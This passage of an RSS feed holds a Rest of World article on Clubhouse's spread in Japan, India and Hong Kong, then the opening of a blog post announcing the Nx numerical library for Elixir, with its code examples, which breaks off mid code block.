<p>Since December, people have joined Clubhouse, a fast-growing audio platform <a href="https://www.theinformation.com/articles/clubhouse-gets-investment-interest-at-1-billion-valuation">reportedly</a> valued at $1 billion, from countries including Ghana, Saudi Arabia, and <a href="https://www.reuters.com/article/us-clubhouse-thailand/thailand-warns-against-app-clubhouse-after-monarchy-discussions-idUSKBN2AH0VR?fbclid=IwAR0MtZxoE9dup4cAlLF7P3sYuaBkhjODgUraH5iefoLX_rs3RLp0Ip0YpSA">Thailand</a>. The app, which is currently invite-only, has been installed more than 5.5 million times, with 16% of those downloads in Japan, according to one <a href="https://www.washingtonpost.com/technology/2021/02/10/what-is-clubhouse-faq/">estimate</a>. From Berlin to Delhi, people are hosting live conversations that sound like a mix between a Zoom webinar and happy hour gossip.</p>



<p>Clubhouse is perhaps <a href="https://www.nytimes.com/2020/05/19/technology/clubby-silicon-valley-app-clubhouse.html">best-known</a> for attracting Silicon Valley insiders like <a href="https://www.businessinsider.com/clubhouse-app-good-time-show-hosts-elon-musk-mark-zuckerberg-2021-2">Elon Musk</a> and receiving funding from <a href="https://www.platformer.news/p/clubhouses-moment-arrives">Andreessen Horowitz</a>, a major venture capital firm whose <a href="https://www.platformer.news/p/clubhouses-moment-arrives">partners</a> are also noteworthy Clubhouse users. Launched in March of last year, Clubhouse is already confronting the challenges many social media platforms face when they scale internationally, especially when it comes to <a href="https://www.bloomberg.com/news/articles/2021-02-11/black-doctors-work-overtime-to-combat-clubhouse-covid-19-myths?sref=QYWxDQ1o">moderation</a> and <a href="https://www.businessinsider.in/tech/news/clubhouse-says-it-will-review-its-policies-after-stanford-warned-that-data-may-be-shared-with-chinas-government/articleshow/80898264.cms">security</a>. As it grows, Clubhouse will need to consider how to protect users in more authoritarian countries like China, where it was recently blocked by the government after users created conversations, or ‚Äúrooms,‚Äù <a href="https://twitter.com/wongmjane/status/1358632701872381952">to openly discuss taboo topics</a> like <a href="https://restofworld.org/2020/counter-surveillance-revolution/">human rights abuses</a> in Xinjiang and <a href="https://restofworld.org/2020/lihkg-hong-kong-protests-forum/">pro-democracy protests</a> in Hong Kong.</p>



<p><em>Rest of World</em> took a look at four places that have seen a recent spike in Clubhouse users ‚Äî Japan, India, Nigeria, and Hong Kong ‚Äî to better understand the app‚Äôs global rise, as well as the ripple effects new users in each location are leaving in their wake.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Clubhouse_Flags-Japan-2-40x24.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Clubhouse_Flags-Japan-2-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Clubhouse_Flags-Japan-2-400x240.png 400w, https://restofworld.org/wp-content/uploads/2021/02/Clubhouse_Flags-Japan-2-600x360.png 600w, https://restofworld.org/wp-content/uploads/2021/02/Clubhouse_Flags-Japan-2-1000x600.png 1000w, https://restofworld.org/wp-content/uploads/2021/02/Clubhouse_Flags-Japan-2-1600x960.png 1600w, " sizes="(max-width: 640px) 100vw, 370px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<h3><strong>JAPAN ‚Äî Chasing celebrity&nbsp;</strong></h3>



<div><p><strong><em>&nbsp;</em></strong>Elon Musk first <a href="https://twitter.com/elonmusk/status/1355983231988862978?s=21">hopped on Clubhouse</a> in late January to discuss cryptocurrencies and investing in GameStop. The Tesla CEO‚Äôs appearance helped bring mainstream attention to Clubhouse in the U.S., but it would be a mistake to cite Musk as the catalyst for its rise elsewhere. <strong><em></em></strong><em>‚Äú</em>He has very little to do with the Japanese growth,‚Äù Koichi Tsunoda told <em>Rest of World </em>in a private Clubhouse chat, his preferred venue for an interview. A week before the Musk cameo, Tsunoda, the CFO of a platform for businesses <a href="https://yappli.co.jp/">called Yappli</a>, was part of the first wave of Japanese entrepreneurs to arrive on Clubhouse. Tsunoda said it took only three days for the majority of Japan‚Äôs best-known tech influencers to secure invites. Tsunoda joined hoping to connect with investors abroad and bring more visibility to Japan‚Äôs startup sector. But the app quickly expanded beyond the country‚Äôs tech bubble.</p><p>A handful of Japanese celebrities were invited to Clubhouse in late January by friends in the tech industry, including TV commentator and comedian <a href="https://twitter.com/atsushilonboo/status/1354441357738184704">Atsushi Tamura</a>, who was one of the first widely recognized figures to log on. He was followed by actress and fashion designer Naomi Watanabe, who racked up over 500,000 followers in her first two weeks on the app. Celebrated kabuki and film actor Ebizo Ichikawa is also a <a href="https://twitter.com/EBIZO_DES/status/1356535391403208706">Clubhouse convert</a>, appearing in rooms every few days in recent weeks.</p></div>


    <figure>
      <div>
				<ul>
					<li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/phone1-40x67.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/phone1-600x1066.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/phone1-400x667.png 400w, https://restofworld.org/wp-content/uploads/2021/02/phone1-600x1000.png 600w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/phone4-40x67.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/phone4-600x1066.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/phone4-400x667.png 400w, https://restofworld.org/wp-content/uploads/2021/02/phone4-600x1000.png 600w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/phone3-40x67.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/phone3-600x1066.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/phone3-400x667.png 400w, https://restofworld.org/wp-content/uploads/2021/02/phone3-600x1000.png 600w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/phone5-40x67.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/phone5-600x1066.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/phone5-400x667.png 400w, https://restofworld.org/wp-content/uploads/2021/02/phone5-600x1000.png 600w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li>
				</ul>
			</div>
      
    </figure>


<p>This constellation of celebrities made the app enticing to the general public. ‚ÄúClubhouse, maybe due to a lack of users, is very intimate,‚Äù said Tsunoda. ‚ÄúYou can talk to singers in Japan, you can talk to those comedians, and you can actually have a conversation with them.‚Äù</p>



<p>Some Japanese-langauge rooms made passing references to Musk‚Äôs talk when he finally joined Clubhouse on January 31, but by that time, the app‚Äôs ‚Äúhallways‚Äù ‚Äî the Clubhouse equivalent of a news feed ‚Äî were already full of Japanese users hosting their own conversations. The app was established enough that <a href="https://twitter.com/takaya_i/status/1355047724643573761">government minister Taro Kono</a> even jumped on to recap his recent visit to Davos, Switzerland.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Clubhouse_Flags-India-2-40x24.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Clubhouse_Flags-India-2-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Clubhouse_Flags-India-2-400x240.png 400w, https://restofworld.org/wp-content/uploads/2021/02/Clubhouse_Flags-India-2-600x360.png 600w, https://restofworld.org/wp-content/uploads/2021/02/Clubhouse_Flags-India-2-1000x600.png 1000w, https://restofworld.org/wp-content/uploads/2021/02/Clubhouse_Flags-India-2-1600x960.png 1600w, " sizes="(max-width: 640px) 100vw, 370px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<h3><strong>INDIA ‚Äî The iOS barrier</strong></h3>



<p>Every day, Pankaj Jain said he receives from 200 to 300 Clubhouse notifications. The angel investor and COO of the startup <a href="https://workomo.com/?utm_source=twitter&amp;utm_campaign=profile_pjain&amp;utm_medium=social">Workomo</a> joined in September, as members of the South Asian diaspora working in Silicon Valley carved out a space for themselves on the platform. But Jain, who lives in New York, saw no communities ‚Äî or what the app calls ‚Äúclubs‚Äù ‚Äî devoted specifically to India, let alone its startup ecosystem. After roping in Utsav Somani, a Delhi-based partner at AngelList India, he co-founded <a href="https://indianstartup.club/">The Indian Startup Club</a>, which now has nearly 8,000 members.<em><br></em><br>The club often runs a handful of rooms simultaneously, which have included pitch stages for budding Indian entrepreneurs, mental health and personal finance workshops for founders, and deep dives into cutting-edge industries like cryptocurrency and agricultural technology. ‚ÄúI never dreamt Clubhouse would blow up so quickly,‚Äù said Jain. ‚ÄúNow it‚Äôs turning into a job. I just sit there and keep letting people in.‚Äù</p>



<div><p>Jain hoped to broaden the conversation on Clubhouse beyond Silicon Valley, but when he tried inviting friends and colleagues from India to the platform, he found himself scrounging through his contact list for anyone who used an iPhone. Clubhouse is currently only available on iOS, but only around 3% <a href="https://www.statista.com/chart/22702/andoid-ios-market-share-selected-countries/">of Indians smartphone users</a> have an Apple device, which <a href="https://www.thequint.com/tech-and-auto/tech-news/here-is-why-apple-iphone-costs-more-in-india-compared-to-us#read-more">cost 40% more</a> in India than in the U.S., due to taxes and importation costs. ‚ÄúThere‚Äôs a significant amount of FOMO that‚Äôs been going on,‚Äù said Jain. ‚ÄúImmediately, a huge part of the population can‚Äôt get on the app ‚Äî no matter what.‚Äù</p><p>In early January, noted Silicon Valley venture capitalists Balaji Srinivasan and Naval Ravikant announced they would host a <a href="https://twitter.com/naval/status/1346171352009510913">Startup Bharat</a> conversation on Clubhouse for ‚Äútaking questions from Indian founders and open sourcing the Silicon Valley playbook.‚Äù Indian tech Twitter lit up with pleas for invites as well as posts <a href="https://twitter.com/kaustiwari/status/1346318199554363392">bemoaning iOS elitism</a>. The moment captured Clubhouse‚Äôs limitations in India: When moneyed investors created a space for the country‚Äôs tech workers, most of the industry was still stuck at the door, waiting to be let in.</p></div>



<p>Clubhouse‚Äôs founders, Rohan Seth and Paul Davison, said in a January <a href="https://www.joinclubhouse.com/welcoming-more-voices">blog post</a> that the company would ‚Äúbegin work on our Android app soon.‚Äù Clubhouse did not respond to a request for comment asking for more information about a specific timetable. In the meantime, Jain said he has heard whispers among Indian entrepreneurs about building an Android clone of Clubhouse for <a href="https://yourstory.com/2019/12/india-internet-2019-report-reliance-jio">non-English speaking users</a> in India.&nbsp;</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Clubhouse_Flags-HK-2-40x24.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Clubhouse_Flags-HK-2-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Clubhouse_Flags-HK-2-400x240.png 400w, https://restofworld.org/wp-content/uploads/2021/02/Clubhouse_Flags-HK-2-600x360.png 600w, https://restofworld.org/wp-content/uploads/2021/02/Clubhouse_Flags-HK-2-1000x600.png 1000w, https://restofworld.org/wp-content/uploads/2021/02/Clubhouse_Flags-HK-2-1600x960.png 1600w, " sizes="(max-width: 640px) 100vw, 370px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<h3><strong>HONG KONG ‚Äî Transnational, multilingual&nbsp;</strong></h3>



<div><p>Jane Manchun Wong describes herself as Clubhouse‚Äôs first user in Hong Kong. Until recently, she was simply waiting for everyone else to show up. ‚ÄúThe HK Clubhouse community was nonexistent before mid-January,‚Äù she told<em> Rest of World </em>over email. A technology blogger and software engineer, Wong said she searched for months for other Hong Kongers using the app. On January 18, she came across a <a href="https://twitter.com/wongmjane/status/1351198778028650500">Cantonese-speaking room</a> hosted by Jonny Chan, who works in the tech industry in San Francisco and was chatting with a dozen or so of his friends. ‚ÄúIt was this serendipitous moment,‚Äù said Chan. ‚ÄúI felt, wow, Clubhouse really nailed the organic connection.‚Äù</p><p>The pair had never met in person and lived on different continents, but they started working together to create some of the first Cantonese-speaking rooms on Clubhouse. The number of Hong Kong-based users on the app quickly grew, and the new arrivals began joining Wong and Chan‚Äôs conversations.&nbsp;</p></div>



<p>When Chan eventually decided to launch a <a href="https://twitter.com/Jonnychn/status/1356285748979200001">24-hour Cantonese room</a>, he didn‚Äôt think they could keep it open for the full day. But one perk of making friends across the world is that when Chan decided to call it a night, he could hand over the moderation baton to Wong, who kept things going from Hong Kong. ‚ÄúI woke up, and it was still going: I was so surprised,‚Äù Chan said. When the session hit the 24-hour mark, everyone clapped by flashing on and off their mute buttons. ‚ÄúIt‚Äôs one of those moments that you don‚Äôt forget,‚Äù Chan said. ‚ÄúIt‚Äôs just this aha moment when you think, Wow, this app is so powerful.‚Äù</p>



<figure><blockquote><p>‚ÄúIt‚Äôs just this aha moment when you think, Wow, this app is so powerful.‚Äù</p></blockquote></figure>



<div><p>Transnational run-ins are not uncommon on Clubhouse. Even <a href="https://www.wired.com/story/beijing-ban-clubhouse-wont-deter-listeners/amp">after the app was banned</a> in China, Mandarin speakers have logged on to have honest and deeply personal conversations, often touching on sensitive political subjects like relations between China and Taiwan. Japanese entrepreneurs and German investors have stepped into Indian-hosted rooms to deliberate the merits of moving to Bangalore for work. And Wong has taken part in discussions between users in Hong Kong and the U.S. about the experience of being Asian-American.</p><p>The cross-border dialogues aren‚Äôt without incident. Wong recalled multiple instances of harassment in her rooms, where users talked in gibberish to mock Cantonese speakers or raised their hand just to tell Wong and others to speak in English. ‚ÄúI found these behaviors racist and offensive,‚Äù said Wong. ‚ÄúWhile we fortunately can report trolling, this kind of behavior can make us feel less safe on the platform.‚Äù&nbsp;</p></div>



<p>The problem of audio moderation is not new: social media platforms <a href="https://cmci.colorado.edu/idlab/assets/bibliography/pdf/Jiang2019-discord.pdf">like Discord</a> and <a href="https://www.protocol.com/bulletins/clubhouse-china-blowing-up-censorship">YY in China</a> have featured live-audio chat rooms for years. <a href="https://www.poynter.org/fact-checking/2018/meet-the-next-misinformation-format-fake-audio-messages/">WhatsApp audio messages</a> have also been a noted source of misinformation. But critics have already accused Clubhouse of struggling to moderate English conversations, let alone those in other languages. ‚ÄúI doubt Clubhouse‚Äôs moderation team understands all of the languages being spoken on the app, potentially leaving some abuses unchecked,‚Äù said Wong.</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Clubhouse_Flags-Nigeria-2-40x24.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Clubhouse_Flags-Nigeria-2-768x432.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/Clubhouse_Flags-Nigeria-2-400x240.png 400w, https://restofworld.org/wp-content/uploads/2021/02/Clubhouse_Flags-Nigeria-2-600x360.png 600w, https://restofworld.org/wp-content/uploads/2021/02/Clubhouse_Flags-Nigeria-2-1000x600.png 1000w, https://restofworld.org/wp-content/uploads/2021/02/Clubhouse_Flags-Nigeria-2-1600x960.png 1600w, " sizes="(max-width: 640px) 100vw, 370px" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<h3><strong>NIGERIA</strong> ‚Äì <strong>Flirting, music, and charity</strong></h3>



<p>In mid-January, Nigerian radio personality Lanre Shonubi started a room on Clubhouse he called <a href="https://www.instagram.com/p/CKCQI0XDziS/?igshid=15ikg7y67sh9h">Shoot Your Shot Pro Max</a>. It began originally as a space to host fun, casual ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2021/four-countries-one-clubhouse/">https://restofworld.org/2021/four-countries-one-clubhouse/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2021/four-countries-one-clubhouse/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26179391</guid>
            <pubDate>Thu, 18 Feb 2021 13:10:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nx (Numerical Elixir) is now publicly available]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26179373">thread link</a>) | @che_shr_cat
<br/>
February 18, 2021 | https://dashbit.co/blog/nx-numerical-elixir-is-now-publicly-available | <a href="https://web.archive.org/web/*/https://dashbit.co/blog/nx-numerical-elixir-is-now-publicly-available">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    
<ul>
  <li>
    <i></i> Jos√© Valim
  </li>
  <li>
    <i></i> February 18th, 2021
  </li>
  <li>
    <i></i><a href="https://dashbit.co/blog/tags/nx">nx</a>, <a href="https://dashbit.co/blog/tags/defn">defn</a>
  </li>
</ul>
<p><img src="https://dashbit.co/images/posts/2021/nx.png" alt="Nx" width="400"></p>
<p>
Sean Moriarity and I are glad to announce that the project we have been working on for the last 3 months, Nx, is finally <a href="https://github.com/elixir-nx/nx">publicly available on GitHub</a>. Our goal with Nx is to provide the foundation for Numerical Elixir.</p>
<p>
In this blog post, I am going to outline the work we have done so far, some of the design decisions, and what we are planning to explore next. If you are looking for other resources to learn about Nx, you can <a href="https://thinkingelixir.com/podcast-episodes/034-jose-valim-reveals-project-nx/">hear me unveiling Nx on the ThinkingElixir podcast</a>.</p>
<h2>
  Nx</h2>
<p>
Nx is a multi-dimensional tensors library for Elixir with multi-staged compilation to the CPU/GPU. Let‚Äôs see an example:</p>
<pre><code><span>iex&gt; </span><span>t</span><span> </span><span>=</span><span> </span><span>Nx</span><span>.</span><span>tensor</span><span data-group-id="4885761117-1">(</span><span data-group-id="4885761117-2">[</span><span data-group-id="4885761117-3">[</span><span>1</span><span>,</span><span> </span><span>2</span><span data-group-id="4885761117-3">]</span><span>,</span><span> </span><span data-group-id="4885761117-4">[</span><span>3</span><span>,</span><span> </span><span>4</span><span data-group-id="4885761117-4">]</span><span data-group-id="4885761117-2">]</span><span data-group-id="4885761117-1">)</span><span>
</span><span data-group-id="4885761117-5">#</span><span data-group-id="4885761117-5">Nx.Tensor</span><span data-group-id="4885761117-5">&lt;</span><span>
  </span><span>s64</span><span data-group-id="4885761117-6">[</span><span>2</span><span data-group-id="4885761117-6">]</span><span data-group-id="4885761117-7">[</span><span>2</span><span data-group-id="4885761117-7">]</span><span>
  </span><span data-group-id="4885761117-8">[</span><span>
    </span><span data-group-id="4885761117-9">[</span><span>1</span><span>,</span><span> </span><span>2</span><span data-group-id="4885761117-9">]</span><span>,</span><span>
    </span><span data-group-id="4885761117-10">[</span><span>3</span><span>,</span><span> </span><span>4</span><span data-group-id="4885761117-10">]</span><span>
  </span><span data-group-id="4885761117-8">]</span><span>
</span><span data-group-id="4885761117-5">&gt;</span></code></pre>
<p>
As you see, tensors have a type (s64) and a shape (2x2). Tensor operations are also done with the <code>Nx</code> module. To implement <a href="https://en.wikipedia.org/wiki/Softmax_function">the Softmax function</a>:</p>
<pre><code><span>iex&gt; </span><span>t</span><span> </span><span>=</span><span> </span><span>Nx</span><span>.</span><span>tensor</span><span data-group-id="2015320651-1">(</span><span data-group-id="2015320651-2">[</span><span data-group-id="2015320651-3">[</span><span>1</span><span>,</span><span> </span><span>2</span><span data-group-id="2015320651-3">]</span><span>,</span><span> </span><span data-group-id="2015320651-4">[</span><span>3</span><span>,</span><span> </span><span>4</span><span data-group-id="2015320651-4">]</span><span data-group-id="2015320651-2">]</span><span data-group-id="2015320651-1">)</span><span>
</span><span>iex&gt; </span><span>Nx</span><span>.</span><span>divide</span><span data-group-id="2015320651-5">(</span><span>Nx</span><span>.</span><span>exp</span><span data-group-id="2015320651-6">(</span><span>t</span><span data-group-id="2015320651-6">)</span><span>,</span><span> </span><span>Nx</span><span>.</span><span>sum</span><span data-group-id="2015320651-7">(</span><span>Nx</span><span>.</span><span>exp</span><span data-group-id="2015320651-8">(</span><span>t</span><span data-group-id="2015320651-8">)</span><span data-group-id="2015320651-7">)</span><span data-group-id="2015320651-5">)</span><span>
</span><span data-group-id="2015320651-9">#</span><span data-group-id="2015320651-9">Nx.Tensor</span><span data-group-id="2015320651-9">&lt;</span><span>
  </span><span>f64</span><span data-group-id="2015320651-10">[</span><span>2</span><span data-group-id="2015320651-10">]</span><span data-group-id="2015320651-11">[</span><span>2</span><span data-group-id="2015320651-11">]</span><span>
  </span><span data-group-id="2015320651-12">[</span><span>
    </span><span data-group-id="2015320651-13">[</span><span>0.03205860328008499</span><span>,</span><span> </span><span>0.08714431874203257</span><span data-group-id="2015320651-13">]</span><span>,</span><span>
    </span><span data-group-id="2015320651-14">[</span><span>0.23688281808991013</span><span>,</span><span> </span><span>0.6439142598879722</span><span data-group-id="2015320651-14">]</span><span>
  </span><span data-group-id="2015320651-12">]</span><span>
</span><span data-group-id="2015320651-9">&gt;</span></code></pre>
<p>
The high-level features in Nx are:</p>
<ul>
  <li>
    <p>
Typed multi-dimensional tensors, where the tensors can be unsigned integers (<code>u8</code>, <code>u16</code>, <code>u32</code>, <code>u64</code>), signed integers (<code>s8</code>, <code>s16</code>, <code>s32</code>, <code>s64</code>), floats (<code>f32</code>, <code>f64</code>) and brain floats (<code>bf16</code>);    </p>
  </li>
  <li>
    <p>
<a href="http://nlp.seas.harvard.edu/NamedTensor">Named tensors</a>, allowing developers to give names to each dimension, leading to more readable and less error prone codebases;    </p>
  </li>
  <li>
    <p>
Automatic differentiation, also known as autograd. The <code>grad</code> function provides reverse-mode differentiation, useful for simulations, training probabilistic models, etc;    </p>
  </li>
  <li>
    <p>
Tensors backends, which enables the main <code>Nx</code> API to be used to manipulate binary tensors, GPU-backed tensors, sparse matrices, and more;    </p>
  </li>
  <li>
    <p>
Numerical definitions, known as <code>defn</code>, provide multi-stage compilation of tensor operations to multiple targets, such as highly specialized CPU code or the GPU. The compilation can happen either ahead-of-time (AOT) or just-in-time (JIT) with a compiler of your choice;    </p>
  </li>
</ul>
<p>
For Python developers, <code>Nx</code> currently takes its main inspirations from <a href="https://numpy.org/"><code>Numpy</code></a> and <a href="https://github.com/google/jax"><code>JAX</code></a> but packaged into a single unified library.</p>
<p>
Our initial efforts have focused on the underlying abstractions. For example, while Nx implements dense tensors out-of-the-box, we also want the same high-level API to be valid for sparse tensors. You should also be able to use all functions in the <code>Nx</code> module with tensors that are backed by Elixir binaries and with tensors that are stored directly in the GPU.</p>
<p>
By ensuring the underlying tensor backend is ultimately replaceable, we can build an ecosystem of libraries on top of Nx, and allow end-users to experiment with different backends, hardware, and approaches to run their software on.</p>
<p>
<em>Nx‚Äôs mascot is the Numbat, a marsupial native to southern Australia. Unfortunately the Numbat are endangered and it is estimated to be fewer than 1000 left. If you are excited about Nx, consider donating to Numbat conservation efforts, such as <a href="https://www.numbat.org.au/">Project Numbat</a> and <a href="https://www.australianwildlife.org/">Australian Wildlife Conservancy</a>.</em></p>
<h2>
Numerical definitions</h2>
<p>
One of the most important features in <code>Nx</code> is the numerical definition, called <code>defn</code>. Numerical definitions are a subset of Elixir tailored for numerical computing. Here is the <code>softmax</code> formula above, now written with <code>defn</code>:</p>
<pre><code><span>defmodule</span><span> </span><span>Formula</span><span> </span><span data-group-id="4810618200-1">do</span><span>
  </span><span>import</span><span> </span><span>Nx.Defn</span><span>

  </span><span>defn</span><span> </span><span>softmax</span><span data-group-id="4810618200-2">(</span><span>t</span><span data-group-id="4810618200-2">)</span><span> </span><span data-group-id="4810618200-3">do</span><span>
    </span><span>inspect_expr</span><span data-group-id="4810618200-4">(</span><span>Nx</span><span>.</span><span>exp</span><span data-group-id="4810618200-5">(</span><span>t</span><span data-group-id="4810618200-5">)</span><span> </span><span>/</span><span> </span><span>Nx</span><span>.</span><span>sum</span><span data-group-id="4810618200-6">(</span><span>Nx</span><span>.</span><span>exp</span><span data-group-id="4810618200-7">(</span><span>t</span><span data-group-id="4810618200-7">)</span><span data-group-id="4810618200-6">)</span><span data-group-id="4810618200-4">)</span><span>
  </span><span data-group-id="4810618200-3">end</span><span>
</span><span data-group-id="4810618200-1">end</span></code></pre>
<p>
The first difference we see with <code>defn</code> is that Elixir‚Äôs built-in operators have been augmented to also work with tensors. Effectively, <code>defn</code> replaces Elixir‚Äôs <code>Kernel</code> with <code>Nx.Defn.Kernel</code>.</p>
<p>
However, <code>defn</code> goes even further. When using <code>defn</code>, <code>Nx</code> builds a computation with all of your tensor operations. Let‚Äôs inspect it:</p>
<pre><code><span>defn</span><span> </span><span>softmax</span><span data-group-id="0860724160-1">(</span><span>t</span><span data-group-id="0860724160-1">)</span><span> </span><span data-group-id="0860724160-2">do</span><span>
  </span><span>inspect_expr</span><span data-group-id="0860724160-3">(</span><span>Nx</span><span>.</span><span>exp</span><span data-group-id="0860724160-4">(</span><span>t</span><span data-group-id="0860724160-4">)</span><span> </span><span>/</span><span> </span><span>Nx</span><span>.</span><span>sum</span><span data-group-id="0860724160-5">(</span><span>Nx</span><span>.</span><span>exp</span><span data-group-id="0860724160-6">(</span><span>t</span><span data-group-id="0860724160-6">)</span><span data-group-id="0860724160-5">)</span><span data-group-id="0860724160-3">)</span><span>
</span><span data-group-id="0860724160-2">end</span></code></pre>
<p>
Now when invoked, you will see this printed:</p>
<pre><code><span>iex(3)&gt; </span><span>Formula</span><span>.</span><span>softmax</span><span data-group-id="4848142189-1">(</span><span>Nx</span><span>.</span><span>tensor</span><span data-group-id="4848142189-2">(</span><span data-group-id="4848142189-3">[</span><span data-group-id="4848142189-4">[</span><span>1</span><span>,</span><span> </span><span>2</span><span data-group-id="4848142189-4">]</span><span>,</span><span> </span><span data-group-id="4848142189-5">[</span><span>3</span><span>,</span><span> </span><span>4</span><span data-group-id="4848142189-5">]</span><span data-group-id="4848142189-3">]</span><span data-group-id="4848142189-2">)</span><span data-group-id="4848142189-1">)</span><span>
</span><span data-group-id="4848142189-6">#</span><span data-group-id="4848142189-6">Nx.Tensor</span><span data-group-id="4848142189-6">&lt;</span><span>
  </span><span>f64</span><span data-group-id="4848142189-7">[</span><span>2</span><span data-group-id="4848142189-7">]</span><span data-group-id="4848142189-8">[</span><span>2</span><span data-group-id="4848142189-8">]</span><span>
  
  </span><span>Nx.Defn.Expr</span><span>
  </span><span>parameter</span><span> </span><span>a</span><span>                                 </span><span>s64</span><span data-group-id="4848142189-9">[</span><span>2</span><span data-group-id="4848142189-9">]</span><span data-group-id="4848142189-10">[</span><span>2</span><span data-group-id="4848142189-10">]</span><span>
  </span><span>b</span><span> </span><span>=</span><span> </span><span>exp</span><span> </span><span data-group-id="4848142189-11">[</span><span> </span><span>a</span><span> </span><span data-group-id="4848142189-11">]</span><span>                               </span><span>f64</span><span data-group-id="4848142189-12">[</span><span>2</span><span data-group-id="4848142189-12">]</span><span data-group-id="4848142189-13">[</span><span>2</span><span data-group-id="4848142189-13">]</span><span>
  </span><span>c</span><span> </span><span>=</span><span> </span><span>exp</span><span> </span><span data-group-id="4848142189-14">[</span><span> </span><span>a</span><span> </span><span data-group-id="4848142189-14">]</span><span>                               </span><span>f64</span><span data-group-id="4848142189-15">[</span><span>2</span><span data-group-id="4848142189-15">]</span><span data-group-id="4848142189-16">[</span><span>2</span><span data-group-id="4848142189-16">]</span><span>
  </span><span>d</span><span> </span><span>=</span><span> </span><span>sum</span><span> </span><span data-group-id="4848142189-17">[</span><span> </span><span>c</span><span>,</span><span> </span><span>axes</span><span>:</span><span> </span><span>nil</span><span>,</span><span> </span><span>keep_axes</span><span>:</span><span> </span><span>false</span><span> </span><span data-group-id="4848142189-17">]</span><span>  </span><span>f64</span><span>
  </span><span>e</span><span> </span><span>=</span><span> </span><span>divide</span><span> </span><span data-group-id="4848142189-18">[</span><span> </span><span>b</span><span>,</span><span> </span><span>d</span><span> </span><span data-group-id="4848142189-18">]</span><span>                         </span><span>f64</span><span data-group-id="4848142189-19">[</span><span>2</span><span data-group-id="4848142189-19">]</span><span data-group-id="4848142189-20">[</span><span>2</span><span data-group-id="4848142189-20">]</span><span>
</span><span data-group-id="4848142189-6">&gt;</span><span>
</span><span data-group-id="4848142189-21">#</span><span data-group-id="4848142189-21">Nx.Tensor</span><span data-group-id="4848142189-21">&lt;</span><span>
  </span><span>f64</span><span data-group-id="4848142189-22">[</span><span>2</span><span data-group-id="4848142189-22">]</span><span data-group-id="4848142189-23">[</span><span>2</span><span data-group-id="4848142189-23">]</span><span>
  </span><span data-group-id="4848142189-24">[</span><span>
    </span><span data-group-id="4848142189-25">[</span><span>0.03205860328008499</span><span>,</span><span> </span><span>0.08714431874203257</span><span data-group-id="4848142189-25">]</span><span>,</span><span>
    </span><span data-group-id="4848142189-26">[</span><span>0.23688281808991013</span><span>,</span><span> </span><span>0.6439142598879722</span><span data-group-id="4848142189-26">]</span><span>
  </span><span data-group-id="4848142189-24">]</span><span>
</span><span data-group-id="4848142189-21">&gt;</span></code></pre>
<p>
This computation graph can also be transformed programatically. The transformation is precisely how we implement automatic differentiation, also known as <code>autograd</code>, by traversing each node and computing their derivative:</p>
<pre><code><span>defn</span><span> </span><span>grad_softmax</span><span data-group-id="5969204985-1">(</span><span>t</span><span data-group-id="5969204985-1">)</span><span> </span><span data-group-id="5969204985-2">do</span><span>
